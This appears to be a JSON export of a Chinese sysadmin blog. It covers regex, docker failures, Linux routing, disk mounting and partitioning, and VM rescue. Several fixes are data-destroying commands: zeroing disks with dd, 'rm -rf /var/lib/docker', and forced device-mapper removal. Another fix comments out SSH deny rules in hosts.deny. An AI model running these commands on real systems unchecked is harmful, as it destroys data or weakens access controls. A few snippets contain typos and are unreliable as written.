pattern.findall(teststr)[&#x27;wwc&#x27;, &#x27;c&#x27;, &#x27;c&#x27;, &#x27;wc&#x27;, &#x27;c&#x27;, &#x27;c&#x27;] ‘.*’ 除\\n以外任意字符出现0次以及以上，贪婪，开始到结束所有符合规则的所有内容 1234pattern = re.compile(r&#x27;w.*c&#x27;)print pattern.findall(teststr)[&#x27;wwcdc&#x27;, &#x27;wc&#x27;, &#x27;wordcc&#x27;] ‘.*?’ 除\\n以外任意字符出现0次以及以上，非贪婪，截取开始到结束第一个符合规则的内容 1234pattern = re.compile(r&#x27;w.*?c&#x27;)print pattern.findall(teststr)[&#x27;wwc&#x27;, &#x27;wc&#x27;, &#x27;wordc&#x27;] ‘(.*?)’ 匹配内容同（4），但是输出只保留括号中内容 1234pattern = re.compile(r&#x27;w(.*?)c&#x27;)print pattern.findall(teststr)[&#x27;w&#x27;, &#x27;&#x27;, &#x27;ord&#x27;] 在（5）的匹配结果下，re.S不会对\\n进行中断，re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符） 1234pattern = r&#x27;w(.*?)c&#x27;print re.findall(pattern, teststr, re.S)[&#x27;w&#x27;, &#x27;\\n&#x27;, &#x27;&#x27;, &#x27;ord&#x27;]","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"docker启动失败","slug":"docker启动失败","date":"2021-03-14T16:00:00.000Z","updated":"2022-02-16T02:04:38.000Z","comments":true,"path":"2021/03/15/docker启动失败/","permalink":"http://example.com/2021/03/15/docker%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/","excerpt":"","text":"异常一起因：前台反馈部署容器失败，进入服务器后发现docker无法启动 尝试重启服务(systemctl restart docker)，但是还是不行出现以下状况 查看docker状态 使用dockerd查看，发现这是只读文件系统 将其重新挂载，重启服务 发现还是不行，dockerd一下 发现无法连接&#x2F;run/containerd/containerd.sock，启动失败次数太多导致停止启动 查了很多的解决办法，这一篇很OK：解决Linux docker启动不了的问题这个方法来自Docker daemon and Containerd dockerd out of sync in 18.09 #421的issue 先将containerd停掉，再启动（直接重启不管用） 12345systemctl stop containerdsystemctl start containerd#启动dockersystemctl start docker.service Linux中排查docker启动过程,可以通过如下思路： 1234567891011121314#查看docker的状态sudo docker info #启动正常输出client 和 server的信息#通用查看docker状态的方式systemctl status docker.service#启动失败 查看docker的日志，journalctl -u docker.service或者直接,dockerd#根据启动失败日志分析原因，如果是文件权限相关，则修改权限 异常二error while creating mount source path ‘&#x2F;data1’: mkdir &#x2F;data1: file exists 可能是短时间多次重启导致 123456Job for docker.service failed because start of the service was attempted too often.See &quot;systemctl status docker.service&quot; and &quot;journalctl -xe&quot; for details.To force a start use &quot;systemctl reset-failed docker.service&quot; followed by &quot;systemctl start docker.service&quot; again.systemctl reset-failed docker systemctl start docker 异常三无法删除docker目录（rm: 无法删除”&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay&#x2F;XXXXXXXXXXXXXX&#x2F;merged”: 设备或资源忙） 异常四docker启动失败：Your kernel does not support cgroup memory limit 查看日志发现如下警告12345WARN Your kernel does not support cgroup memory limit WARN Unable to find cpu cgroup in mounts WARN Unable to find blkio cgroup in mounts WARN Unable to find cpuset cgroup in mounts WARN mountpoint for pids not found 解决方法这是在ubuntu或其他基于Debian的系统上才会出现的问题，原因是系统默认未开启swap限制。(开启后会使系统内存占用多1%,性能下降约10%,即使没有运行docker) 修改系统的&#x2F;etc&#x2F;default&#x2F;grub file文件，加一行 1GRUB_CMDLINE_LINUX=&quot;cgroup_enable=memory swapaccount=1&quot; 上一步是固定的下一步就多了 1Run: “sudo update-bootloader –refresh” 或者是更新系统的GRUB： 1update-grub 这应该是不通版本更新GRUB的方法吧最后reboot我是直接reboot的，然后就OK了 参考链接 异常五can’t create unix socket &#x2F;var&#x2F;run&#x2F;docker.sock: is a directory 解决方法 1234#保守点，把 docker.sock 重命名cd /var/run $$ mv docker.sock docker.socker_backup#或者直接删除rm -rf /var/run/docker.sock/ 卸载docker 列出docker所有的包 1yum list installed|grep docker 删除docker的包 1yum -y remove docker.x86_64 docker-client.x86_64 docker-common.x86_64 删除已有镜像和容器（慎重，根据需要执行） 1rm -rf /var/lib/docker 卸载并重装docker","categories":[{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"ethtool","slug":"ethtool","date":"2021-03-14T16:00:00.000Z","updated":"2022-04-11T01:53:36.000Z","comments":true,"path":"2021/03/15/ethtool/","permalink":"http://example.com/2021/03/15/ethtool/","excerpt":"","text":"给网卡点灯123ethtool --identify eth2 20这个意思是说，让eth2标识的网卡的灯点亮20秒！如果网卡标号与网卡实际的物理位置关系乱了，你又不知道eth2是哪个网卡，上述网卡点灯程序就会让你知道了。","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"ethtool","slug":"ethtool","permalink":"http://example.com/tags/ethtool/"}]},{"title":"linux路由","slug":"linux路由","date":"2021-03-14T16:00:00.000Z","updated":"2021-10-18T07:27:38.000Z","comments":true,"path":"2021/03/15/linux路由/","permalink":"http://example.com/2021/03/15/linux%E8%B7%AF%E7%94%B1/","excerpt":"","text":"简介比如说进一栋大楼找一个人，你要先找大爷问问，有没有这个人，大爷就是路由表，你问的人就是网络地址，如果有的话，大爷会说这个人在402室，402就是那个网卡 找一个路由表看一下吧 路由表详解介绍路由表之前需要知道一些ip的常识 ip地址是一个网卡在网络世界的通讯地址，也就是：街道地址+门牌号 例如：小树林67号、小池塘67号，都是67号，但是街道不同，在外面你说你家门牌号是67号人家不一定知道是哪里，但你说你家在小树林，那就知道了。 1234567891011121314151617181920212223242526route -nDestination Gateway Genmask Flags Iface0.0.0.0 192.168.10.1 0.0.0.0 UG em1100.82.128.1 0.0.0.0 255.255.255.255 UH ppp1100.82.128.1 0.0.0.0 255.255.255.255 UH ppp2100.82.128.1 0.0.0.0 255.255.255.255 UH ppp3100.82.128.1 0.0.0.0 255.255.255.255 UH ppp4100.82.128.1 0.0.0.0 255.255.255.255 UH ppp5Destination: 目标网络或目标主机。 Destination 为 default（0.0.0.0）时，表示这个是默认网关，所有数据都发到这个网关（这里是192.168.10.1)这个可以是网络地址（街道）、主机地址、拨号网络播出ip的网关比如：IP：100.82.243.66 网关：100.82.128.1/32掩码是32，代表只有一台主机Gateway: 网关地址，0.0.0.0 表示当前记录对应的 Destination 跟本机在同一个网段，通信时不需要经过网关Genmask: Destination 字段的网络掩码，Destination 是主机时需要设置为 255.255.255.255，是默认路由时会设置为 0.0.0.0Flags: 标记，含义参考表格后面的解释Iface： 这个路由传递封包的接口。网卡名字，例如 ppp1 Destination, Genmask：这两个玩意儿就是分别是 network 与 netmask,这两个可以组成一个完整的网络Gateway：该网域是通过那个 gateway 连接出去的？ 如果显示 0.0.0.0 表示该路由是直接由本机传送，亦即可以透过局域网络的 MAC 直接传讯； 如果有显示 IP 的话，表示该路由需要经过路由器 (通讯闸) 的帮忙才能够传送出去。 Flags 含义： U (route is up)：该路由是启动的； H (target is a host)：目标是一部主机 (IP) 而非网域； G (use gateway)：需要透过外部的主机 (gateway) 来转递封包； R (reinstate route for dynamic routing)：使用动态路由时，恢复路由信息的旗标； D (dynamically installed by daemon or redirect)：已经由服务或转 port 功能配置为动态路由 M (modified from routing daemon or redirect)：路由已经被修改了； ! (reject route)：这个路由将不会被接受(用来抵挡不安全的网域！) linux内核的路由种类默认路由当目标主机的ip，或者是目标主机的网络地址不在路由表中，数据包就会发送到默认路由（默认网关）上 默认路由的 Destination 是 default 或 0.0.0.0 1234route -nDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 192.168.10.1 0.0.0.0 UG 100 0 0 em1 主机路由主机可以到达的网络。下面示例中，对于 10.0.0.0&#x2F;24 这个网络，通过网关 10.139.128.1 网关路由 1234route -nDestination Gateway Genmask Flags Metric Ref Use Iface10.0.0.0 10.139.128.1 255.255.255.0 UG 0 0 0 eth0 网络路由意思就是主机能把数据包送到那个网络，或者说能从那个网络接收数据包 1234route -nDestination Gateway Genmask Flags Metric Ref Use Iface39.165.91.0 0.0.0.0 255.255.255.128 U 0 0 0 ppp0 这里的 39.165.91.0 就是网络地址 示意图 问题1: 按上面的路由表来看,如果要访问10.1.1.1这个IP,请问会怎么走? 答: 会通过10.1.1.0&#x2F;255.255.255.0这个路由条目后面指示的ens33网卡去寻找10.1.1.1。 问题2: 按上面的路由表来看,如果要访问119.75.217.26这个IP,请问会怎么走? 答: 会通过网关10.1.1.2去寻找。 问题3: 为什么route -n能看到这几条路由(不同机器可能还不一样) 答:因为本机ens33这个网卡有10.1.1.0&#x2F;24这个网段的IP,所以就会默认产生类似下面的路由条目 10.1.1.0 0.0.0.0 255.255.255.0 U 0 0 0 ens33 169.254.0.0&#x2F;24是保留网关 10.1.1.2是配置的网关 访问一个ip的流程当在一台linux机器上要访问一个目标ip时，请记住linux以下四步口诀(linux默认的是单路由表)，如果本机有目标ip，则会直接访问本地; 如果本地没有目标ip，则看第2步 用route -n查看路由，如果路由条目里包含了目标ip的网段，则数据包就会从对应路由条目后面的网卡出去 如果没有对应网段的路由条目，则全部都走网关 如果网关也没有，则报错：网络不可达 （注意: 当不能直接到达目标ip, 那么每到达一个机器都会重复上面四步，直到找到目标) 有关linux路由的命令查看路由123456789101112131415[root@linux ~]# ip route show &lt;==单纯的显示出路由的配置而已[root@linux ~]# ip route [add|del] [IP或网域] [via gateway] [dev 装置]参数：show ：单纯的显示出路由表，也可以使用 list ；add|del ：添加 (add) 或删除 (del) 路由的意思。 IP或网域：可使用 192.168.50.0/24 之类的网域或者是单纯的 IP ； via ：从那个 gateway 出去，不一定需要； dev ：由那个装置连出去，这就需要了！ mtu ：可以额外的配置 MTU 的数值喔！范例一：显示出目前的路由数据[root@linux ~]# ip route show192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.2169.254.0.0/16 dev eth1 scope linkdefault via 192.168.1.254 dev eth1 如上表所示，最简单的功能就是显示出目前的路由信息，其实跟 route 这个命令相同啦！ 指示必须要注意几个小东西： proto：此路由的路由协议，主要有 redirect, kernel, boot, static, ra 等， 其中 kernel 指的是直接由核心判断自动配置。 scope：路由的范围，主要是 link ，亦即是与本装置有关的直接联机。 路由的添加与删除12345678910111213141516171819202122232425范例二：添加路由，主要是本机直接可沟通的网域[root@linux ~]# ip route add 192.168.5.0/24 dev eth0# 针对本机直接沟通的网域配置好路由，不需要透过外部的路由器[root@linux ~]# ip route show192.168.5.0/24 dev eth0 scope link....以下省略....范例三：添加可以通往外部的路由，需透过 router 喔！[root@linux ~]# ip route add 192.168.10.0/24 via 192.168.5.100 dev eth0[root@linux ~]# ip route show192.168.5.0/24 dev eth0 scope link....其他省略....192.168.10.0/24 via 192.168.5.100 dev eth0# 仔细看喔，因为我有 192.168.5.0/24 的路由存在 (我的网卡直接联系)，# 所以才可以将 192.168.10.0/24 的路由丢给 192.168.5.100 # 那部主机来帮忙传递喔！与之前提到的 route 命令是一样的限制！范例四：添加默认路由[root@linux ~]# ip route add default via 192.168.1.2 dev eth0# 那个 192.168.1.2 就是我的默认路由器 (gateway) 的意思啊！ ^_^# 真的记得，只要一个默认路由就 OK ！范例五：删除路由[root@linux ~]# ip route del 192.168.10.0/24[root@linux ~]# ip route del 192.168.5.0/24 启动、关闭与配置装置的相关信息123456789[root@linux ~]# ip link set eth0 up# 启动 eth0 这个装置接口[root@linux ~]# ip link set eth0 down# 关闭 eth0 这个装置接口[root@linux ~]# ip link set eth0 mtu 1000# 更改 MTU 的值，达到 1000 bytes# MTU：网络上传送的最大数据包 更改【网卡代号、 MAC 地址信息】配置前要先关闭该网络卡，否则不会成功 12345678910111213141516171819范例三：修改网络卡代号、MAC 等参数[root@linux ~]# ip link set eth0 name vbirdSIOCSIFNAME: Device or resource busy# 因为该装置目前是启动的，所以不能这样做配置。你应该要这样做：[root@linux ~]# ip link set eth0 down &lt;==关闭界面[root@linux ~]# ip link set eth0 name vbird &lt;==重新配置[root@linux ~]# ip link show &lt;==观察一下2. vbird: &lt;BROADCAST,MILTICASE&gt; mtu 900 qdisc pfifo_fast qlen 1000 link/ehter 00:40:d0:13:c3:46 brd ff:ff:ff:ff:ff:ff# 怕了吧！连网络卡代号都可以改变！不过，玩玩后记得改回来啊！# 因为我们的 ifcfg-eth0 还是使用原本的装置代号！避免有问题，要改回来[root@linux ~]# ip link set vbird name eth0 &lt;==界面改回来[root@linux ~]# ip link set eth0 address aa:aa:aa:aa:aa:aa[root@linux ~]# ip link show eth0# 如果你的网络卡支持硬件地址 (MAC) 可以更改的话，# 那么上面这个动作就可以更改你的网络卡地址了！厉害吧！# 不过，还是那句老话，测试完之后请立刻改回来啊！ 清空路由表1ip route flush table enp1s0f0 rt_tables文件位置：&#x2F;etc&#x2F;iproute2&#x2F;rt_tables rt_tables就是给路由表命名的东西 12345678910111213141516cat /etc/iproute2/rt_tables ## reserved values#255 local254 main253 default0 unspec## local##1 inr.ruhep250 mgt10 ppp011 ppp1 11————-ppp1 优先级——–路由表名字 一个路由表可以有多个路由 一个路由表可以有多个路由规则 增加网关12ip route add default via 117.158.200.129 dev enp1s0f0 src 117.158.200.187 table enp1s0f0ip route add default via 网关 dev 网卡名 src 网卡IP table 路由表名 网关只能加路由条目里已有的路由网段里的一个IP (ping不通此IP都可以） 加网关不需要指定子网掩码临时配置与删除(立即生效,重启网络服务就没了) 12route add default gw x.x.x.x route del default gw x.x.x.x 参考链接linux网络科普：路由器，集线器，交换机，网桥，光猫有啥区别？","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"容器部署常见问题","slug":"容器部署常见问腿","date":"2021-03-14T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/15/容器部署常见问腿/","permalink":"http://example.com/2021/03/15/%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2%E5%B8%B8%E8%A7%81%E9%97%AE%E8%85%BF/","excerpt":"","text":"查看当前ip地区运营商curl --connect-timeout 5 myip.ipip.net 查看内存容量free -g 查看cpu逻辑内核cat /proc/cpuinfo |grep -c &quot;processor&quot; 根目录爆满 清理根目录缓存（一般是core的缓存&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;$uuid&#x2F;diff&#x2F;P2P&#x2F;core.25914）find /var/lib/docker/ -name &#39;core\\.[0-9]*&#39; -type f -print -exec rm -rf &#123;&#125; \\; &amp;&amp; truncate -s 0 /var/lib/docker/containers/*/*-json.log;find /var/lib/docker/ -name &#39;popmachine\\.log\\.[0-9]*&#39; -type f -print -exec rm -rf &#123;&#125; \\; 有可能是掉盘的时候缓存下到根目录上导致根目录爆满。一般来说，缓存是下在附加盘上的，当掉盘是，缓存就下到根目录下对应的&#x2F;data里，这就造成了根目录爆满。解决方法：先把附加盘挂掉，然后查看根目录下什么文件占空间，比如说&#x2F;data下文件占空间，把根目录下&#x2F;data下的内容清空就行。 如果还是不行有可能是映射文件太大，查看一下根目录下那个文件最大，看看是不是映射文件，如果是，就把它删掉，然后做个容器映射。hyp -l $uuid -p /root/sh/container-partition-getcanshu.sh -c &quot;-b cp2p v5.31&quot; 查看服务器上面的硬盘p.s. 安装阵列卡的硬盘看不出到底有几块硬盘查看硬盘信息lsscsi$ lsscsiscsi 设备及其属性[0:0:8:0]—-disk—-FUJITSU—-MAM3184MP—-0105—-&#x2F;dev&#x2F;sda[2:0:0:0]—-cd——CREATIVE—CD5233E——1.00—-&#x2F;dev&#x2F;scd0[3:0:5:0]—-tape—-HP———C5713A——-H910—-&#x2F;dev&#x2F;st0[3:0:5:1]—-mediumx-HP———C5713A——-H910—–[4:0:0:0]—-disk—-Linux——scsi_debug—0004—-&#x2F;dev&#x2F;sdb第一列：SCSI设备id：host, channel,id,lun。第二列：设备类型。（有可能是阵列卡）第3，4，5列：设备厂商，型号，版本信息。最后一列：设备主节点名。lsscsi -s显示容量大小。-c 用全称显示默认的信息。-d 显示设备主，次设备号。-g 显示对应的sg设备名。-H 显示主机控制器列表，-Hl,-Hlv。-l 显示相关属性，-ll,-lll&#x3D;-L。-v 显示设备属性所在目录。-x 以16进制显示lun号。-p 输出DIF,DIX 保护类型。-P 输出有效的保护模式信息。-i 显示udev相关的属性-w 显示WWN-t显示相应传输信息(ATA,FC,SBP,ISCSI,SPI,SAS,SATA,USB)，-Ht,-tl.（包括sas地址） 查看硬盘转不转cat /sys/block/*/queue/rotational 看容器日志docker logs name 开服务器的权限 hyp -l $uuid -login 1 进去$uuid里删除黑名单sed -i ‘&#x2F;sshd:all&#x2F;s&#x2F;sshd&#x2F;#sshd&#x2F;g’ &#x2F;etc&#x2F;hosts.deny &amp;&amp; sed -i ‘&#x2F;sshd:ALL&#x2F;s&#x2F;sshd&#x2F;#sshd&#x2F;g’ &#x2F;etc&#x2F;hosts.denyservice xinetd restart 收回权限hyp -l $uuid -login 2 服务（带宽、线路）配置参数&#x2F;opt&#x2F;hyops&#x2F;","categories":[{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"hyp","slug":"hyp","permalink":"http://example.com/tags/hyp/"}]},{"title":"Xshell突出显示集正则配置","slug":"Xshell突出显示集正则","date":"2021-03-10T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/11/Xshell突出显示集正则/","permalink":"http://example.com/2021/03/11/Xshell%E7%AA%81%E5%87%BA%E6%98%BE%E7%A4%BA%E9%9B%86%E6%AD%A3%E5%88%99/","excerpt":"","text":"Xshell突出显示集正则配置 错误规则 1(\\b((bad|wrong|incorrect|improper|invalid|unsupported|bad)( file| memory)? (descriptor|alloc(ation)?|addr(ess)?|owner(ship)?|arg(ument)?|param(eter)?|setting|length|filename)|not properly|improperly|(operation |connection |authentication |access |permission )?(false|no|ko|denied|disallowed|not allowed|refused|problem|failed|failure|not permitted)|no [A-Za-z]+( [A-Za-z]+)? found|invalid|unsupported|not supported|seg(mentation )?fault|corruption|corrupted|corrupt|overflow|underrun|not ok|unimplemented|unsuccessfull|not implemented|permerrors?|fehlers?|errore|errors?|erreurs?|fejl|virhe|greška|erro|fel|\\(ee\\)|\\(ni\\))\\b) 成功规则 1(\\b(true|yes|ok|accepted|allowed|enabled|connected|erfolgreich|exitoso|successo|sucedido|framgångsrik|successfully|successful|succeeded|success)\\b) 警告规则 1(\\b(\\[\\-w[A-Za-z-]+\\]|caught signal [0-9]+|cannot|(connection (to (remote host|[a-z0-9.]+) )?)?(closed|terminated|stopped|not responding)|exited|no more [A-Za-z] available|unexpected|(command |binary |file )?not found|(o)+ps|out of (space|memory)|low (memory|disk)|unknown|disabled|disconnected|deprecated|refused|disconnect(ion)?|advertencia|avvertimento|attention|warnings?|achtung|exclamation|alerts?|warnungs?|advarsel|pedwarn|aviso|varoitus|upozorenje|peringatan|uyari|varning|avertissement|\\(ww\\)|\\(\\?\\?\\)|could not|unable to)\\b) 提示规则 1(\\b(last (failed )?login:|launching|checking|loading|creating|building|important|booting|starting|notice|informational|informationen|informazioni|informação|oplysninger|informations?|info|información|informasi|note|\\(ii\\)|\\(\\!\\!\\))\\b) 主机ip 1(\\b(localhost|([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-4])\\.[0-9]+\\.[0-9]+\\.[0-9]+|null|none)\\b) 网址url 1\\b(http(s)?://[A-Za-z0-9_.:/&amp;?=%~#&#123;&#125;()@+-]+)\\b","categories":[{"name":"Xshell","slug":"Xshell","permalink":"http://example.com/categories/Xshell/"}],"tags":[{"name":"配置","slug":"配置","permalink":"http://example.com/tags/%E9%85%8D%E7%BD%AE/"}]},{"title":"更改uuid&查看服务器信息","slug":"更改uuid","date":"2021-03-10T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/03/11/更改uuid/","permalink":"http://example.com/2021/03/11/%E6%9B%B4%E6%94%B9uuid/","excerpt":"","text":"更改uuid在客户端新增一个设备，得到新的uuid使用之前的uuid登录服务器，修改/etc/salt/minion_id文件，删除里面原有的uuid并加入新的uuid，重启cgroupv2（systemctl restart cgroupv2）然后清理hyp的缓存 hyp --clear，接收这个uuid hyp -l $uuid -dst a然后就可以使用uuid登录进去了","categories":[{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"磁盘无法挂载（VMFS_volume_member的解决办法）","slug":"磁盘无法挂载","date":"2021-03-10T16:00:00.000Z","updated":"2021-09-26T09:58:44.000Z","comments":true,"path":"2021/03/11/磁盘无法挂载/","permalink":"http://example.com/2021/03/11/%E7%A3%81%E7%9B%98%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD/","excerpt":"","text":"问题1在挂载磁盘时总是报【mount: 未知的文件系统类型“VMFS_volume_member”】这样的错误解决方法 123456789101112131415dd if=/dev/zero of=/dev/sdb1 bs=4M count=1dd if=/dev/zero of=/dev/sdb bs=1M count=16 查看磁盘类型cat /etc/fstab格式化磁盘mkfs.xfs /dev/sdb1 -fmount /dev/sdb1 /data1看看有没有挂载成功lsblk 问题2umount: &#x2F;data: device is busy解决方法 1234fuser -m /data/data: 10278c 10279c 然后吧占用的进程kill掉就行kill -9 pid 其他相关的命令 12345fuser -kvm /data删除相关程序umount -l /data强行解除挂载 问题3device-mapper: remove ioctl failed: Device or resource busy分区时遇到 The resulting partition is not properly aligned for best performance. 生成的分区未正确对齐，无法获得最佳性能 通常是磁盘下面有这样的东东 这时候使用parted进去给他分区，如下图所示 一般遇到上面这种情况，磁盘在&#x2F;dev&#x2F;mapper下，使用 123使用这个强制删除就行dmsetup remove --force /dev//mapper/ddf1_44656c6c202020201000005b10281f34 问题4mkfs.xfs: cannot open &#x2F;dev&#x2F;sdl1: 设备或资源忙格式化分区时遇到上面的问题 123dmsetup ls 查看谁在占用dmsetup remove 删除占用的程序dmsetup remove --force /dev//mapper/ddf1_44656c6c202020201000005b10281f34 相关的命令磁盘分区命令123parted -s /dev/sdb mklabel gpt mkpart primary ext4 0% 100%parted -s /dev/sdb mklabel gpt","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"pip安装本地包","slug":"pip安装本地包","date":"2020-11-19T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/11/20/pip安装本地包/","permalink":"http://example.com/2020/11/20/pip%E5%AE%89%E8%A3%85%E6%9C%AC%E5%9C%B0%E5%8C%85/","excerpt":"","text":"如果pip下载速度极低则可以从官网上下载本地安装包安装python库pip install *.whl 直接在pip install命令后添加whl包的全路径名就能本地安装成功了下载需要的包，一般为zip、tar.gz等的压缩包，解压后，打开命令行，进入解压目录，使用python setup.py install命令安装。","categories":[{"name":"python","slug":"python","permalink":"http://example.com/categories/python/"}],"tags":[{"name":"pip","slug":"pip","permalink":"http://example.com/tags/pip/"}]},{"title":"centos虚拟机系统救援","slug":"VBOX中的centos虚拟机救援","date":"2020-10-26T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/10/27/VBOX中的centos虚拟机救援/","permalink":"http://example.com/2020/10/27/VBOX%E4%B8%AD%E7%9A%84centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%95%91%E6%8F%B4/","excerpt":"","text":"VBOX中的 centos虚拟机 救援某天配置selinux时手一贱，保存后闪退SSH，重启时发现无法进入系统，虚拟机报错图片如下 回忆起之前的操作，最后一步将 &#x2F;etc&#x2F;selinux&#x2F;config 中的SELINUXTYPE&#x3D;permissive 这个问题的主要原因是系统的&#x2F;lib64&#x2F;libc-2.12.so和&#x2F;lib64&#x2F;libc.so.6的档案丢失或者软链接错误 解决方法 修改启动模式，更改为光碟启动 用光碟启动救援模式，进入shell命令页面（挂载原始磁盘），执行chroot &#x2F;mnt&#x2F;sysimage（会报错） 拷贝&#x2F;lib64&#x2F;libc-2.12.so和&#x2F;lib64&#x2F;libc.so.6档案 执行：chroot &#x2F;mnt&#x2F;sysimage（如果不报错则证明以修复） 一：修改启动模式VBOX 二：用光碟启动救援模式选择Rescue install system恶后回车 然后按照以下图片选择 三：拷贝&#x2F;lib64&#x2F;libc-2.12.so和&#x2F;lib64&#x2F;libc.so.6档案（如果拷贝失败则使用强制拷贝命令 cp -rf）123cp /lib64/libc-2.12.so /mnt/sysimage/lib64/libc-2.12.socp /lib64/libc.so.6 /mnt/sysimage/lib64/libc.so.6 然后执行 1chroot /mnt/sysimage 进入原系统，修改&#x2F;etc&#x2F;selinux&#x2F;config的配置 1234/etc/selinux/config before change:SELINUX=enforcing and SELINUXTYPE=permissive/etc/selinux/config after change: SELINUX=permissive and SELINUXTYPE=permissive 如果引导分区也损坏了，则在原系统的基础上升级系统，使用磁盘映像自动化的修复引导分区并且保留原系统上的文件 参考1参考2","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"系统救援","slug":"系统救援","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E6%95%91%E6%8F%B4/"}]},{"title":"linux磁盘分区","slug":"linux磁盘分区","date":"2020-10-12T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/10/13/linux磁盘分区/","permalink":"http://example.com/2020/10/13/linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/","excerpt":"","text":"磁盘分区 参考：linux硬盘分区这种操作基本上是在root权限下进行的 fdisk先查看磁盘是否分区 1fdisk -l 然后开始分区 1fdisk /dev/sdb 分区完了以后开始格式化分区 1mkfs.ext4 /dev/sdb1 将分区格式化为ext4格式 挂载分区 12mkdir /d1mount /dev/sdb1 /d1 分区自动挂载 查看磁盘分区的UUID1234567891011# sudo blkid/dev/sda1: UUID=&quot;9dece6b7-d63d-4c9f-8931-3ff5d25965ae&quot; TYPE=&quot;ext4&quot; /dev/sda2: UUID=&quot;OEamKx-sppz-hPqx-rpqT-NFyQ-T4HJ-5yu2Fg&quot; TYPE=&quot;LVM2_member&quot; /dev/sdb1: UUID=&quot;RLvoic-RCoH-deFJ-6sSO-25ez-a7ZG-o8gQzS&quot; TYPE=&quot;LVM2_member&quot; /dev/sdb5: UUID=&quot;95d9cddf-fe3b-4dc1-8a8f-f87344f03ba0&quot; TYPE=&quot;swap&quot; /dev/sdb6: UUID=&quot;Ad2LUL-48rb-rjPQ-YYis-Q8dw-Ih6b-W1WiBi&quot; TYPE=&quot;LVM2_member&quot; /dev/mapper/vg_centos-lv_root: UUID=&quot;428c0814-d826-4bf0-bebe-21fdd1701e09&quot; TYPE=&quot;ext4&quot; /dev/mapper/vg_centos-lv_swap: UUID=&quot;c483d48c-56a4-4c90-b920-79a98ee594ec&quot; TYPE=&quot;swap&quot; /dev/mapper/MediaVG-Mp3LV: UUID=&quot;23000b69-386c-48da-8547-f5ac485c2c6f&quot; TYPE=&quot;ext4&quot; 配置开机自动挂载文件&#x2F;etc&#x2F;fstab1vi /etc/fstab 加入 UUID&#x3D;”23000b69-386c-48da-8547-f5ac485c2c6f” &#x2F;vodstore ext4 defaults 0 1 具体说明，以挂载&#x2F;dev&#x2F;sdb1为例：：分区定位，可以给UUID或LABEL，例如：UUID&#x3D;6E9ADAC29ADA85CD或LABEL&#x3D;software：具体挂载点的位置，例如：&#x2F;data：挂载磁盘类型，linux分区一般为ext4，windows分区一般为ntfs：挂载参数，一般为defaults：磁盘检查，默认为0：磁盘检查，默认为0，不需要检查 重启系统修改完&#x2F;etc&#x2F;fstab文件后，运行1mount -a 验证一下配置是否正确。如果配置不正确可能会导致系统无法正常启动。 御卸分区 1umount /dev/sdb1 删除分区 1234fdisk /dev/sdcd1w 根据提示删除即可 磁盘分区也可以使用cfdisk 添加swap交换分区 查看swap 空间大小1# free -m 查看swap 空间1# swapon -s 等价于1# cat /proc/swaps 添加一个交换分区使用fdisk来创建交换分区（假设 &#x2F;dev&#x2F;sdb2 是创建的交换分区）使用 mkswap 命令来设置交换分区：1# mkswap /dev/sdb2 启用交换分区：1# swapon /dev/sdb2 写入&#x2F;etc&#x2F;fstab,以便在引导时启用：&#x2F;dev&#x2F;sdb2 swap swap defaults 0 01echo “/dev/sdb2 swap swap defaults 0 0” &gt;&gt; /etc/fstab 添加一个交换文件创建大小为512M的交换文件：1# dd if=/dev/zero of=/swapfile1 bs=1024k count=512 使用 mkswap 命令来设置交换文件：1# mkswap /swapfile1 启用交换分区：1# swapon /swapfile1 写入&#x2F;etc&#x2F;fstab,以便在引导时启用：&#x2F;swapfile1 swap swap defaults 0 01echo &quot;/swapfile1 swap swap defaults 0 0&quot; /etc/fstab 新添了交换分区并启用它之后，请查看 cat &#x2F;proc&#x2F;swaps 